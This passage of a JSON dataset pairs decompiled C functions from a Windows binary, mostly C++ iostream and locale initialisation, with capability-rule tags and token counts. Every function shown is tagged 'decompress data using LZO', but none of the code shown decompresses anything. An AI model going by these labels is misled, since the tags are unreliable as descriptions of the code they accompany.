(bVar6);\n    bVar5 = false;\n    bVar4 = (!bVar4 && !bVar6) == bVar4;\n    if (!bVar4) {\n        iVar1 = 6;\n        puVar2 = var_2ch;\n        puVar3 = 0x523ffb;\n        do {\n            if (iVar1 == 0) break;\n            iVar1 = iVar1 + -1;\n            bVar5 = *puVar2 < *puVar3;\n            bVar4 = *puVar2 == *puVar3;\n            puVar2 = puVar2 + 1;\n            puVar3 = puVar3 + 1;\n        } while (bVar4);\n        if ((!bVar5 && !bVar4) != bVar5) {\n            uStack72 = 0;\n            puStack76 = var_2ch;\n            fcn.004ae9c0();\n            fcn.004b8870();\n            fcn.004aea30(&var_1ch);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 581
    },
    "004b6c70": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004b6c70(uint8_t **arg_8h, int32_t arg_ch)\n\n{\n    uint *in_ECX;\n    int32_t iVar1;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    bool bVar4;\n    bool bVar5;\n    bool bVar6;\n    uint8_t *puStack76;\n    uint uStack72;\n    uint8_t *var_2ch;\n    uint var_1ch;\n    uint var_ch;\n    \n    puVar2 = *arg_8h;\n    *in_ECX = 0x52bd24;\n    in_ECX[2] = 0;\n    in_ECX[1] = arg_ch != 0;\n    puStack76 = NULL;\n    var_2ch = puVar2;\n    fcn.004b8870();\n    *in_ECX = 0x52bb44;\n    iVar1 = 2;\n    bVar4 = &puStack76 < 0x4;\n    bVar6 = *0x10 == 0x50;\n    puVar3 = 0x523ff9;\n    do {\n        if (iVar1 == 0) break;\n        iVar1 = iVar1 + -1;\n        bVar4 = *puVar2 < *puVar3;\n        bVar6 = *puVar2 == *puVar3;\n        puVar2 = puVar2 + 1;\n        puVar3 = puVar3 + 1;\n    } while (bVar6);\n    bVar5 = false;\n    bVar4 = (!bVar4 && !bVar6) == bVar4;\n    if (!bVar4) {\n        iVar1 = 6;\n        puVar2 = var_2ch;\n        puVar3 = 0x523ffb;\n        do {\n            if (iVar1 == 0) break;\n            iVar1 = iVar1 + -1;\n            bVar5 = *puVar2 < *puVar3;\n            bVar4 = *puVar2 == *puVar3;\n            puVar2 = puVar2 + 1;\n            puVar3 = puVar3 + 1;\n        } while (bVar4);\n        if ((!bVar5 && !bVar4) != bVar5) {\n            uStack72 = 0;\n            puStack76 = var_2ch;\n            fcn.004ae9c0();\n            fcn.004b8870();\n            fcn.004aea30(&var_1ch);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 581
    },
    "004b9760": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nchar __cdecl fcn.004b9760(uint arg_8h)\n\n{\n    code *pcVar1;\n    char cVar2;\n    uint uVar3;\n    uint var_8h;\n    \n    cVar2 = *0x516f94;\n    if ((arg_8h != '\\x01') && (*0x516f94 != '\\0')) {\n        fcn.004b9aa0();\n        *0x516f94 = 0;\n        *0x516980 = vtable.c_streambufIwSt11char_traitsIwEE.0;\n        fcn.004aed00();\n        *0x516900 = vtable.c_streambufIwSt11char_traitsIwEE.0;\n        fcn.004aed00();\n        *0x516940 = vtable.c_streambufIwSt11char_traitsIwEE.0;\n        fcn.004aed00();\n        *0x516a40 = vtable.ages_bynameIcE.0;\n        fcn.004aed00();\n        *0x5169c0 = vtable.ages_bynameIcE.0;\n        fcn.004aed00();\n        *0x516a00 = vtable.ages_bynameIcE.0;\n        fcn.004aed00();\n        pcVar1 = *0x515aa0;\n        uVar3 = (**0x515aa0)(1);\n        fcn.00448690(uVar3, 0x10, 0x200);\n        uVar3 = (*pcVar1)(0);\n        fcn.00448690(uVar3, 8, 0x200);\n        uVar3 = (*pcVar1)(2);\n        fcn.00448690(uVar3, 0x10, 0x200);\n        fcn.004bbdd0(0x516b80);\n        fcn.004bbdd0(0x516a80);\n        fcn.004bbdd0(0x516b00);\n        fcn.004bbdd0(0x516b00);\n        uVar3 = (*pcVar1)(1);\n        fcn.00448a20(uVar3, 0x10, 0x200);\n        uVar3 = (*pcVar1)(0);\n        fcn.00448a20(uVar3, 8, 0x200);\n        uVar3 = (*pcVar1)(2);\n        fcn.00448a20(uVar3, 0x10, 0x200);\n        fcn.004bc5f0(0x516d00);\n        fcn.004bc5f0(0x516c00);\n        fcn.004bc5f0(0x516c80);\n        fcn.004bc5f0(0x516c80);\n        fcn.004ba1e0();\n        return cVar2;\n    }\n    return *0x516f94;\n}\n",
        "token_count": 662
    },
    "004b9aa0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid fcn.004b9aa0(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint var_8h;\n    \n    pcVar1 = *0x515aa0;\n    if (*0x515a34 != 0) {\n        LOCK();\n    }\n    if (*0x516f90 == 0) {\n        *0x516f90 = 1;\n        *0x516f94 = 1;\n        uVar2 = (**0x515aa0)(1);\n        *0x516980 = vtable.c_streambufIwSt11char_traitsIwEE.0;\n        *0x516984 = 0;\n        *0x516988 = 0;\n        *0x51698c = 0;\n        *0x516990 = 0;\n        *0x516994 = 0;\n        *0x516998 = 0;\n        fcn.004aec10();\n        *0x516980 = 0x52b474;\n        *0x5169a4 = 0xffffffff;\n        *0x5169a0 = uVar2;\n        uVar2 = (*pcVar1)(0);\n        *0x516900 = vtable.c_streambufIwSt11char_traitsIwEE.0;\n        *0x516904 = 0;\n        *0x516908 = 0;\n        *0x51690c = 0;\n        *0x516910 = 0;\n        *0x516914 = 0;\n        *0x516918 = 0;\n        fcn.004aec10();\n        *0x516900 = 0x52b474;\n        *0x516924 = 0xffffffff;\n        *0x516920 = uVar2;\n        uVar2 = (*pcVar1)(2);\n        *0x516940 = vtable.c_streambufIwSt11char_traitsIwEE.0;\n        *0x516944 = 0;\n        *0x516948 = 0;\n        *0x51694c = 0;\n        *0x516950 = 0;\n        *0x516954 = 0;\n        *0x516958 = 0;\n        fcn.004aec10();\n        *0x516940 = 0x52b474;\n        *0x516964 = 0xffffffff;\n        *0x516960 = uVar2;\n        fcn.004bad50();\n        *0x517234 = 0;\n        *0x517238 = 0;\n        *0x51723c = 0;\n        *0x517240 = 0;\n        *0x517244 = 0;\n        *0x517248 = 0;\n        *0x5171c0 = 0x52be90;\n        *0x5171c4 = 0x52bea4;\n        fcn.004bbb80(0x516980);\n        fcn.004bad50();\n        *0x517058 = 0;\n        *0x51705c = 0;\n        *0x517060 = 0;\n        *0x517064 = 0;\n        *0x517068 = 0;\n        *0x51706c = 0;\n        *0x516fe0 = 0x52be68;\n        *0x516fe8 = 0x52be7c;\n        *0x516fe4 = 0;\n        fcn.004bbb80(0x516900);\n        fcn.004bad50();\n        *0x5170f4 = 0;\n        *0x5170f8 = 0;\n        *0x5170fc = 0;\n        *0x517100 = 0;\n        *0x517104 = 0;\n        *0x517108 = 0;\n        *0x517080 = 0x52be90;\n        *0x517084 = 0x52bea4;\n        fcn.004bbb80(0x516940);\n        fcn.004bad50();\n        *0x517194 = 0;\n        *0x517198 = 0;\n        *0x51719c = 0;\n        *0x5171a0 = 0;\n        *0x5171a4 = 0;\n        *0x5171a8 = 0;\n        *0x517120 = 0x52be90;\n        *0x517124 = 0x52bea4;\n        fcn.004bbb80(0x516940);\n        *0x517058 = 0x5171c0;\n        *0x517090 = *0x517090 | 0x2000;\n        *0x5170f4 = 0x5171c0;\n        uVar2 = (*pcVar1)(1);\n        *0x516a40 = vtable.ages_bynameIcE.0;\n        *0x516a44 = 0;\n        *0x516a48 = 0;\n        *0x516a4c = 0;\n        *0x516a50 = 0;\n        *0x516a54 = 0;\n        *0x516a58 = 0;\n        fcn.004aec10();\n        *0x516a64 = 0xffff;\n        *0x516a40 = 0x52b4b4;\n        *0x516a60 = uVar2;\n        uVar2 = (*pcVar1)(0);\n        *0x5169c0 = vtable.ages_bynameIcE.0;\n        *0x5169c4 = 0;\n        *0x5169c8 = 0;\n        *0x5169cc = 0;\n        *0x5169d0 = 0;\n        *0x5169d4 = 0;\n        *0x5169d8 = 0;\n        fcn.004aec10();\n        *0x5169c0 = 0x52b4b4;\n        *0x5169e4 = 0xffff;\n        *0x5169e0 = uVar2;\n        uVar2 = (*pcVar1)(2);\n        *0x516a00 = vtable.ages_bynameIcE.0;\n        *0x516a04 = 0;\n        *0x516a08 = 0;\n        *0x516a0c = 0;\n        *0x516a10 = 0;\n        *0x516a14 = 0;\n        *0x516a18 = 0;\n        fcn.004aec10();\n        *0x516a00 = 0x52b4b4;\n        *0x516a24 = 0xffff;\n        *0x516a20 = uVar2;\n        fcn.004bad50();\n        *0x5174b4 = 0;\n        *0x5174b8 = 0;\n        *0x5174ba = 0;\n        *0x5174bc = 0;\n        *0x5174c0 = 0;\n        *0x5174c4 = 0;\n        *0x5174c8 = 0;\n        *0x517440 = 0x52c1ec;\n        *0x517444 = 0x52c200;\n        fcn.004bc380(0x516a40);\n        fcn.004bad50();\n        *0x5172d8 = 0;\n        *0x5172dc = 0;\n        *0x5172de = 0;\n        *0x5172e0 = 0;\n        *0x5172e4 = 0;\n        *0x5172e8 = 0;\n        *0x5172ec = 0;\n        *0x517260 = 0x52c1c4;\n        *0x517268 = 0x52c1d8;\n        *0x517264 = 0;\n        fcn.004bc380(0x5169c0);\n        fcn.004bad50();\n        *0x517378 = 0;\n        *0x517374 = 0;\n        *0x51737a = 0;\n        *0x51737c = 0;\n        *0x517380 = 0;\n        *0x517384 = 0;\n        *0x517388 = 0;\n        *0x517300 = 0x52c1ec;\n        *0x517304 = 0x52c200;\n        fcn.004bc380(0x516a00);\n        fcn.004bad50();\n        *0x517414 = 0;\n        *0x517418 = 0;\n        *0x51741a = 0;\n        *0x51741c = 0;\n        *0x517420 = 0;\n        *0x517424 = 0;\n        *0x517428 = 0;\n        *0x5173a0 = 0x52c1ec;\n        *0x5173a4 = 0x52c200;\n        fcn.004bc380(0x516a00);\n        *0x517310 = *0x517310 | 0x2000;\n        if (*0x515a34 == 0) {\n            *0x516f90 = *0x516f90 + 1;\n            *0x5172d8 = 0x517440;\n            *0x517374 = 0x517440;\n            return;\n        }\n        LOCK();\n        *0x516f90 = *0x516f90 + 1;\n        *0x5172d8 = 0x517440;\n        *0x517374 = 0x517440;\n        return;\n    }\n    *0x516f90 = *0x516f90 + 1;\n    return;\n}\n",
        "token_count": 2207
    },
    "004ba260": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __thiscall fcn.004ba260(uint param_1, int32_t param_2)\n\n{\n    fcn.004aebe0(param_2 + 0x6c);\n    fcn.004aed50(param_2);\n    fcn.004b99c0(1);\n    return param_1;\n}\n",
        "token_count": 72
    },
    "004ba2f0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004ba2f0(int32_t param_1)\n\n{\n    uchar auStack16 [8];\n    \n    *(param_1 + 4) = 6;\n    *(param_1 + 8) = 0;\n    *(param_1 + 0xc) = 0x1002;\n    fcn.004aec10();\n    fcn.004aed50(auStack16);\n    fcn.004aed00();\n    return;\n}\n",
        "token_count": 104
    },
    "004ba550": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004ba550(uint arg_8h, int32_t *arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    uint *in_ECX;\n    uint *var_70h;\n    uint var_6ch;\n    uint *var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint *var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    uint *var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_bp_ch;\n    \n    piVar1 = arg_ch[1];\n    iVar2 = *arg_ch;\n    if (*(*piVar1 + 0x10) == fcn.0044ab10) {\n        var_60h = &var_58h;\n        var_58h._0_1_ = 0;\n        if (iVar2 == 1) {\n            fcn.004afdd0(0, 0, \"iostream error\", 0xe);\n        }\n        else {\n            fcn.004afdd0(0, 0, 0x526a18, 0xd);\n        }\n    }\n    else {\n        (**(*piVar1 + 0x10))(piVar1, iVar2);\n    }\n    var_70h = &var_58h;\n    piVar3 = fcn.004afdd0(0, 0, 0x526a3b, 2);\n    var_48h = &var_40h;\n    if (*piVar3 == piVar3 + 2) {\n        var_40h = piVar3[2];\n        var_3ch = piVar3[3];\n        var_38h = piVar3[4];\n        var_34h = piVar3[5];\n    }\n    else {\n        var_40h = piVar3[2];\n        var_48h = *piVar3;\n    }\n    var_44h = piVar3[1];\n    *(piVar3 + 2) = 0;\n    *piVar3 = piVar3 + 2;\n    piVar3[1] = 0;\n    uVar4 = sub.msvcrt.dll_strlen(arg_8h);\n    piVar3 = fcn.004afdd0(0, 0, arg_8h, uVar4);\n    if (*piVar3 == piVar3 + 2) {\n        var_28h = piVar3[2];\n        var_24h = piVar3[3];\n        var_20h = piVar3[4];\n        var_1ch = piVar3[5];\n        var_30h = &var_28h;\n    }\n    else {\n        var_28h = piVar3[2];\n        var_30h = *piVar3;\n    }\n    var_2ch = piVar3[1];\n    *(piVar3 + 2) = 0;\n    *piVar3 = piVar3 + 2;\n    piVar3[1] = 0;\n    fcn.004a0d40(&var_30h);\n    if (var_30h != &var_28h) {\n        fcn.004c2c30(var_30h);\n    }\n    if (var_48h != &var_40h) {\n        fcn.004c2c30(var_48h);\n    }\n    if (var_60h != var_70h) {\n        fcn.004c2c30(var_60h);\n    }\n    in_ECX[3] = piVar1;\n    *in_ECX = 0x52be00;\n    in_ECX[2] = iVar2;\n    return;\n}\n",
        "token_count": 933
    },
    "004ba780": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Removing unreachable block (ram,0x004c5329)\n// WARNING: Removing unreachable block (ram,0x004ba853)\n// WARNING: Removing unreachable block (ram,0x004ba8de)\n// WARNING: Removing unreachable block (ram,0x004c536b)\n\nvoid __cdecl fcn.004ba780(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t **ppiVar3;\n    uint uVar4;\n    uint *in_ECX;\n    int32_t **ppiVar5;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint *var_6ch;\n    uint var_60h;\n    int32_t var_5ch;\n    uint var_58h;\n    uint *var_48h;\n    int32_t var_44h;\n    uint32_t var_40h;\n    int32_t **var_30h;\n    int32_t *var_2ch;\n    int32_t *var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    \n    piVar1 = fcn.00448200();\n    if (*(*piVar1 + 0x10) == fcn.0044ab10) {\n        var_48h = &var_40h;\n        var_44h = 0;\n        var_40h = var_40h & 0xffffff00;\n        fcn.004afdd0(0, 0, \"iostream error\", 0xe);\n    }\n    else {\n        (**(*piVar1 + 0x10))(piVar1, 1);\n    }\n    var_6ch = &var_40h;\n    fcn.004b03b0(*arg_8h, arg_8h[1] + *arg_8h, 0);\n    if (0x7fffffffU - var_5ch < 2) {\n        uVar4 = fcn.004be310(\"basic_string::append\");\n        if (var_30h != arg_8h) {\n            fcn.004c2c30(var_30h);\n        }\n        do {\n            if (var_48h != var_6ch) {\n                fcn.004c2c30(var_48h);\n            }\n            fcn.0043a8e0(uVar4);\n            if (var_48h != var_6ch) {\n                fcn.004c2c30(var_48h);\n            }\n            fcn.0043a8e0(uVar4);\n        } while( true );\n    }\n    fcn.004b1d40(0x526a3b, 2);\n    if (var_5ch + var_44h < 0x10) {\ncode_r0x004ba874:\n        ppiVar3 = fcn.004b1d40(var_48h, var_44h);\n        ppiVar5 = ppiVar3 + 2;\n        var_30h = *ppiVar3;\n        if (var_30h == ppiVar5) {\ncode_r0x004ba94b:\n            var_30h = &var_28h;\n            var_28h = ppiVar3[2];\n            var_24h = ppiVar3[3];\n            var_20h = ppiVar3[4];\n            var_1ch = ppiVar3[5];\n            goto code_r0x004ba8a2;\n        }\n    }\n    else {\n        uVar2 = 0xf;\n        if (var_48h != var_6ch) {\n            uVar2 = var_40h;\n        }\n        if (uVar2 < var_5ch + var_44h) goto code_r0x004ba874;\n        ppiVar3 = fcn.004afdd0(0, 0, &var_58h, var_5ch);\n        ppiVar5 = ppiVar3 + 2;\n        var_30h = *ppiVar3;\n        if (var_30h == ppiVar5) goto code_r0x004ba94b;\n    }\n    var_28h = ppiVar3[2];\ncode_r0x004ba8a2:\n    var_2ch = ppiVar3[1];\n    *(ppiVar3 + 2) = 0;\n    *ppiVar3 = ppiVar5;\n    ppiVar3[1] = NULL;\n    fcn.004a0d40(&var_30h);\n    if (var_30h != &var_28h) {\n        fcn.004c2c30(var_30h);\n    }\n    if (var_48h != var_6ch) {\n        fcn.004c2c30(var_48h);\n    }\n    in_ECX[2] = 1;\n    in_ECX[3] = piVar1;\n    *in_ECX = 0x52be00;\n    return;\n}\n",
        "token_count": 1147
    },
    "004ba9d0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Removing unreachable block (ram,0x004c5390)\n// WARNING: Removing unreachable block (ram,0x004baabb)\n// WARNING: Removing unreachable block (ram,0x004bab40)\n// WARNING: Removing unreachable block (ram,0x004c53b7)\n\nvoid __cdecl fcn.004ba9d0(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    int32_t **ppiVar4;\n    uint uVar5;\n    uint *in_ECX;\n    int32_t **ppiVar6;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint *var_6ch;\n    uint var_60h;\n    int32_t var_5ch;\n    uint var_58h;\n    uint *var_48h;\n    int32_t var_44h;\n    uint32_t var_40h;\n    int32_t **var_30h;\n    int32_t *var_2ch;\n    int32_t *var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    \n    iVar1 = *arg_ch;\n    piVar2 = arg_ch[1];\n    if (*(*piVar2 + 0x10) == fcn.0044ab10) {\n        var_44h = 0;\n        var_48h = &var_40h;\n        var_40h = var_40h & 0xffffff00;\n        if (iVar1 == 1) {\n            fcn.004afdd0(0, 0, \"iostream error\", 0xe);\n        }\n        else {\n            fcn.004afdd0(0, 0, 0x526a18, 0xd);\n        }\n    }\n    else {\n        (**(*piVar2 + 0x10))(piVar2, iVar1);\n    }\n    var_6ch = &var_40h;\n    fcn.004b03b0(*arg_8h, arg_8h[1] + *arg_8h, 0);\n    if (0x7fffffffU - var_5ch < 2) {\n        uVar5 = fcn.004be310(\"basic_string::append\");\n        if (var_30h != arg_8h) {\n            fcn.004c2c30(var_30h);\n        }\n        do {\n            if (var_48h != var_6ch) {\n                fcn.004c2c30(var_48h);\n            }\n            fcn.0043a8e0(uVar5);\n        } while( true );\n    }\n    fcn.004b1d40(0x526a3b, 2);\n    if (var_5ch + var_44h < 0x10) {\ncode_r0x004baad9:\n        ppiVar4 = fcn.004b1d40(var_48h, var_44h);\n        ppiVar6 = ppiVar4 + 2;\n        var_30h = *ppiVar4;\n        if (var_30h == ppiVar6) {\ncode_r0x004babb2:\n            var_30h = &var_28h;\n            var_28h = ppiVar4[2];\n            var_24h = ppiVar4[3];\n            var_20h = ppiVar4[4];\n            var_1ch = ppiVar4[5];\n            goto code_r0x004bab07;\n        }\n    }\n    else {\n        uVar3 = 0xf;\n        if (var_48h != var_6ch) {\n            uVar3 = var_40h;\n        }\n        if (uVar3 < var_5ch + var_44h) goto code_r0x004baad9;\n        ppiVar4 = fcn.004afdd0(0, 0, &var_58h, var_5ch);\n        ppiVar6 = ppiVar4 + 2;\n        var_30h = *ppiVar4;\n        if (var_30h == ppiVar6) goto code_r0x004babb2;\n    }\n    var_28h = ppiVar4[2];\ncode_r0x004bab07:\n    var_2ch = ppiVar4[1];\n    *(ppiVar4 + 2) = 0;\n    *ppiVar4 = ppiVar6;\n    ppiVar4[1] = NULL;\n    fcn.004a0d40(&var_30h);\n    if (var_30h != &var_28h) {\n        fcn.004c2c30(var_30h);\n    }\n    if (var_48h != var_6ch) {\n        fcn.004c2c30(var_48h);\n    }\n    *in_ECX = 0x52be00;\n    in_ECX[2] = iVar1;\n    in_ECX[3] = piVar2;\n    return;\n}\n",
        "token_count": 1186
    },
    "004bac90": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004bac90(uint arg_8h)\n\n{\n    uint *in_ECX;\n    uint var_ch;\n    \n    *in_ECX = 0x52be14;\n    fcn.0048cd70(arg_8h);\n    return;\n}\n",
        "token_count": 74
    },
    "004bbb80": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004bbb80(int32_t param_1, int32_t param_2)\n\n{\n    fcn.004ba2f0();\n    fcn.004bba60(param_1 + 0x6c);\n    *(param_1 + 0x78) = param_2;\n    *(param_1 + 0x74) = 0;\n    *(param_1 + 0x70) = 0;\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 0x14) = param_2 == 0;\n    return;\n}\n",
        "token_count": 138
    },
    "004bbce0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nuint32_t __thiscall fcn.004bbce0(int32_t param_1, uint32_t param_2)\n\n{\n    int32_t *piVar1;\n    uint32_t extraout_ECX;\n    uint32_t var_8h;\n    uint var_ch;\n    uint var_2ch;\n    uint var_1ch;\n    int32_t iStack24;\n    uint uStack20;\n    uint var_ch_2;\n    \n    if (*(param_1 + 0x78) == 0) {\n        var_8h = var_8h | 1;\n    }\n    *(param_1 + 0x14) = var_8h;\n    if ((*(param_1 + 0x10) & var_8h) == 0) {\n        return var_8h;\n    }\n    fcn.004bdff0(\"basic_ios::clear\");\n    fcn.004aebe0(iStack24 + 0x6c);\n    fcn.004ba260(iStack24, uStack20);\n    fcn.004aed00();\n    fcn.004bba60(uStack20);\n    piVar1 = *(iStack24 + 0x78);\n    if (piVar1 != NULL) {\n        fcn.004aebe0(piVar1 + 7);\n        (**(*piVar1 + 8))(uStack20);\n        fcn.004aed50(uStack20);\n        fcn.004aed00();\n    }\n    return extraout_ECX;\n}\n",
        "token_count": 346
    },
    "004bc090": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid __cdecl fcn.004bc090(uint arg_8h)\n\n{\n    uint *in_ECX;\n    uint var_8h;\n    \n    fcn.004bad50();\n    *in_ECX = 0x52ccf0;\n    *(in_ECX + 0x1d) = 0;\n    in_ECX[0x1c] = 0;\n    in_ECX[0x1e] = 0;\n    in_ECX[0x1f] = 0;\n    in_ECX[0x20] = 0;\n    in_ECX[0x21] = 0;\n    fcn.004bbb80(arg_8h);\n    return;\n}\n",
        "token_count": 170
    },
    "004bc150": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid __cdecl fcn.004bc150(uint arg_8h)\n\n{\n    uint *in_ECX;\n    uint var_8h;\n    \n    fcn.004bad50();\n    *in_ECX = 0x52ccf0;\n    *(in_ECX + 0x1d) = 0;\n    in_ECX[0x1c] = 0;\n    in_ECX[0x1e] = 0;\n    in_ECX[0x1f] = 0;\n    in_ECX[0x20] = 0;\n    in_ECX[0x21] = 0;\n    fcn.004bbb80(arg_8h);\n    return;\n}\n",
        "token_count": 170
    },
    "004bc380": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004bc380(int32_t param_1, int32_t param_2)\n\n{\n    fcn.004ba2f0();\n    fcn.004bc290(param_1 + 0x6c);\n    *(param_1 + 0x78) = param_2;\n    *(param_1 + 0x74) = 0;\n    *(param_1 + 0x76) = 0;\n    *(param_1 + 0x70) = 0;\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 0x14) = param_2 == 0;\n    return;\n}\n",
        "token_count": 152
    },
    "004bc500": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nuint32_t __thiscall fcn.004bc500(int32_t param_1, uint32_t param_2)\n\n{\n    int32_t *piVar1;\n    uint32_t extraout_ECX;\n    uint32_t var_8h;\n    uint var_ch;\n    uint var_2ch;\n    uint var_1ch;\n    int32_t iStack24;\n    uint uStack20;\n    uint var_ch_2;\n    \n    if (*(param_1 + 0x78) == 0) {\n        var_8h = var_8h | 1;\n    }\n    *(param_1 + 0x14) = var_8h;\n    if ((*(param_1 + 0x10) & var_8h) == 0) {\n        return var_8h;\n    }\n    fcn.004bdff0(\"basic_ios::clear\");\n    fcn.004aebe0(iStack24 + 0x6c);\n    fcn.004ba260(iStack24, uStack20);\n    fcn.004aed00();\n    fcn.004bc290(uStack20);\n    piVar1 = *(iStack24 + 0x78);\n    if (piVar1 != NULL) {\n        fcn.004aebe0(piVar1 + 7);\n        (**(*piVar1 + 8))(uStack20);\n        fcn.004aed50(uStack20);\n        fcn.004aed00();\n    }\n    return extraout_ECX;\n}\n",
        "token_count": 344
    },
    "004bc860": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid __cdecl fcn.004bc860(uint arg_8h)\n\n{\n    uint *in_ECX;\n    uint var_8h;\n    \n    fcn.004bad50();\n    *in_ECX = 0x52cd00;\n    *(in_ECX + 0x1d) = 0;\n    in_ECX[0x1c] = 0;\n    *(in_ECX + 0x76) = 0;\n    in_ECX[0x1e] = 0;\n    in_ECX[0x1f] = 0;\n    in_ECX[0x20] = 0;\n    in_ECX[0x21] = 0;\n    fcn.004bc380(arg_8h);\n    return;\n}\n",
        "token_count": 184
    },
    "004bc930": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid __cdecl fcn.004bc930(uint arg_8h)\n\n{\n    uint *in_ECX;\n    uint var_8h;\n    \n    fcn.004bad50();\n    *in_ECX = 0x52cd00;\n    *(in_ECX + 0x1d) = 0;\n    in_ECX[0x1c] = 0;\n    *(in_ECX + 0x76) = 0;\n    in_ECX[0x1e] = 0;\n    in_ECX[0x1f] = 0;\n    in_ECX[0x20] = 0;\n    in_ECX[0x21] = 0;\n    fcn.004bc380(arg_8h);\n    return;\n}\n",
        "token_count": 184
    },
    "004bd760": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.004bd760(int32_t *arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    char cVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    ulong uVar10;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_29h;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    \n    fcn.004898e0(arg_8h);\n    if (var_20h == '\\0') goto code_r0x004bd837;\n    iVar4 = *(*arg_8h + -0xc);\n    iVar5 = arg_8h + iVar4;\n    iVar9 = *(iVar5 + 8);\n    if (arg_10h < iVar9) {\n        uVar7 = *(iVar5 + 0xc) & 0xb0;\n        if (uVar7 != 0x20) {\n            iVar8 = iVar9 - arg_10h;\n            if (*(iVar5 + 0x75) != '\\0') {\n                var_29h._0_1_ = *(iVar5 + 0x74);\ncode_r0x004bd7e8:\n                do {\n                    piVar2 = *(arg_8h + iVar4 + 0x78);\n                    if (piVar2[5] < piVar2[6]) {\n                        *piVar2[5] = var_29h;\n                        piVar2[5] = piVar2[5] + 1;\n                    }\n                    else {\n                        iVar5 = (**(*piVar2 + 0x34))(var_29h);\n                        if (iVar5 == -1) {\n                            fcn.004bbce0(*(arg_8h + *(*arg_8h + -0xc) + 0x14) | 1);\n                            iVar5 = *(*arg_8h + -0xc) + arg_8h;\n                            iVar4 = *(iVar5 + 0x14);\n                            goto joined_r0x004bd828;\n                        }\n                    }\n                    iVar4 = *(*arg_8h + -0xc);\n                    iVar8 = iVar8 + -1;\n                } while (iVar8 != 0);\n                iVar5 = arg_8h + iVar4;\n                goto code_r0x004bd8c3;\n            }\n            piVar2 = *(iVar5 + 0x7c);\n            if (piVar2 != NULL) {\n                if (*(piVar2 + 7) == '\\0') {\n                    